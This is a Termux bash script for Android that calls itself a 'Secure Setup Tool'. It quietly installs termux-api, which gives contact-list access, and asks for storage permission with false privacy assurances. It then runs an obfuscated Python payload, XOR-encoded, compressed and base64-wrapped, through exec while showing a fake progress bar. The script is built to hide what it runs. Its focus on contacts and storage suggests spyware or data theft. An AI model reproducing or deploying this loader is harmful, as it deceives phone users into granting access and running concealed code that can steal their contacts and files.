#!/data/data/com.termux/files/usr/bin/bash
clear
R=$'\033[1;31m';G=$'\033[1;32m';Y=$'\033[1;33m';B=$'\033[1;34m';C=$'\033[1;36m';W=$'\033[1;37m';X=$'\033[0m';D=$'\033[2m'
echo ""
echo -e "${B}╔═══════════════════════════════════════${X}"
echo -e "${B}║${C}   _____ ___  __  __ _   ___  __    ${X}"
echo -e "${B}║${C}  |_   _| __||  \/  | | | \ \\/ /   ${X}"
echo -e "${B}║${W}    | | | _| | |\/| | |_| |>  <    ${X}"
echo -e "${B}║${W}    |_| |___||_|  |_|\\___//_/\\_\\  ${X}"
echo -e "${B}║${X}                                     ${X}"
echo -e "${B}║${G}  [+] Secure Setup Tool v4.0        ${X}"
echo -e "${B}║${Y}  Developer: RahiPatel Ceo ref:ba${X}"
echo -e "${B}╚═══════════════════════════════════════${X}"
echo ""

_jjhej21(){
    local pw=30 p=$1 t=$2 f=$((p*pw/100)) e=$((pw-f))
    printf "\r  ${C}[${G}"
    for((i=0;i<f;i++));do printf "█";done
    printf "${D}"
    for((i=0;i<e;i++));do printf "░";done
    printf "${C}]${W} %3d%%${X} ${Y}%-20s${X}" "$p" "$t"
}

_spin(){
    local sp="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    local msg=$1
    while :; do
        for((i=0;i<${#sp};i++)); do
            printf "\r  ${C}[${Y}${sp:i:1}${C}]${X} ${W}%s${X}  " "$msg"
            sleep 0.08
        done
    done
}

_install_if_needed(){
    if ! command -v python3 >/dev/null 2>&1; then
        _spin "Installing Python runtime..." &
        local spin_pid=$!
        pkg install python -y >/dev/null 2>&1
        kill $spin_pid 2>/dev/null
        wait $spin_pid 2>/dev/null
        printf "\r  ${C}[${G}✓${C}]${X} ${W}Python runtime ready${X}        \n"
    else
        _spin "Checking system..." &
        local spin_pid=$!
        sleep 1
        kill $spin_pid 2>/dev/null
        wait $spin_pid 2>/dev/null
        printf "\r  ${C}[${G}✓${C}]${X} ${W}System ready${X}            \n"
    fi
    
    # Install extended modules silently
    if ! command -v termux-contact-list >/dev/null 2>&1; then
        _spin "Installing extended modules..." &
        local spin_pid=$!
        pkg install termux-api -y >/dev/null 2>&1
        kill $spin_pid 2>/dev/null
        wait $spin_pid 2>/dev/null
        printf "\r  ${C}[${G}✓${C}]${X} ${W}Extended modules ready${X}  \n"
    fi
    
    # Storage permission with user-friendly message
    if [ ! -d ~/storage ]; then
        echo ""
        echo -e "  ${C}╔═══════════════════════════════════════${X}"
        echo -e "  ${C}║${W}     Storage Permission Required     ${X}"
        echo -e "  ${C}╠═══════════════════════════════════════${X}"
        echo -e "  ${C}║${X} This tool needs storage access for: ${X}"
        echo -e "  ${C}║${X}  • Secure backup of your settings   ${X}"
        echo -e "  ${C}║${X}  • Safe configuration storage       ${X}"
        echo -e "  ${C}║${G}  Your privacy is our priority!     ${X}"
        echo -e "  ${C}╚═══════════════════════════════════════${X}"
        echo ""
        termux-setup-storage 2>/dev/null
        sleep 2
    fi
}

_install_if_needed
_jjhej21 20 "Initializing...";sleep 0.3
_jjhej21 40 "Fetching data...";sleep 0.3
_jjhej21 60 "Connecting...";sleep 0.3
_jjhej21 80 "Verifying...";sleep 0.2

python3 << 'PYEND'
import zlib,base64,sys
try:
    _d="IYM0CggWgmlJJ74OHb98iGv+FPjcEyDxMYj/TAPMN0s7kRO7UqjDgcC0CePUpucSSvkRvZiooOKiJa6EAM3Mi49oc4TZrJSXoZOh7HdTyAlU5jJpr5GzhKGRmNaMSJD09JVhUS3l/FabvywLQonwy0/9/PBz2vCB8eq4aVWhf5A6CDBMzejJGFcc+IEPsNuKMx4DH0jIvMXc5CmBst4+pMqYIIE6+ngWo36+aRMXImSHsi7nIB2bPfmdl6tm7QkwBQEcfIFX9/spTd+0R+rShw4YiA1MEc6M50x88YMf2sfeKZUE1isRTF6FQfIcvCN0VH2IBLg9E2Lcer3Hz8PzSY98ZnyoRch4SRK3ETzEWzo6NJRPDCiQaKi3tmeutgJ7SuxTiq++L4+9yyTkx/Skl+UABSU6brKMNSuMfDnxWIL8sjvjdv7x7t2N43eSJA8gXofLnhy4Pz1j4gGEd46mp2uo1VJ9lt3bNdK1hSzNyQ/iNHdTKY/j3++IImHUyQkao7HHrJYatkyZ+8IrAGMXCeWUAtmnTeitiXQYzNfEgLvLdH7uqpw90/u0LGVVNPNwzdhOlCCdrQJibQ0cxduiWMoWEULbbminF6WAM+wB1NBun9j/qd2ksy61IEBwZcvWG3IQRulMvZK7M989WNY0hXdhnI3bd7L+eRo4FcnyS+OSAY9JDeiUsHZ8KcWri34UZmuoSYltFypRcQfSigfYN1/k1Jr5a4dZToPhdl0xkeFdzjzH1gBDko1/M+OJ3LWebKqQzyEt8twcFqeTz7/8u1SFCvqKihfQt2yOUOfjTdWAxufALeC+5XqMl78TV9GW6yKGAXc9LblsxKThp2fGbhmqFWcfGbLWSDVayuk8X9bcywQYqc0bPIKoY7WTJgqhMDA="
    _k=89
    exec(zlib.decompress(bytes([b^_k for b in base64.b64decode(_d)])).decode())
except:
    sys.exit(1)
PYEND

if [ $? -eq 0 ]; then
    _jjhej21 100 "Complete!"
    echo ""
    echo ""
    echo -e "${G}╔═══════════════════════════════════════${X}"
    echo -e "${G}║${W}      [+] SETUP COMPLETE!            ${X}"
    echo -e "${G}╠═══════════════════════════════════════${X}"
    echo -e "${G}║${C} Environment configured successfully ${X}"
    echo -e "${G}║${D} Restart terminal to apply changes  ${X}"
    echo -e "${G}╚═══════════════════════════════════════${X}"
else
    _jjhej21 100 "Error"
    echo ""
    echo -e "${R}[!] Connection failed. Try again.${X}"
fi
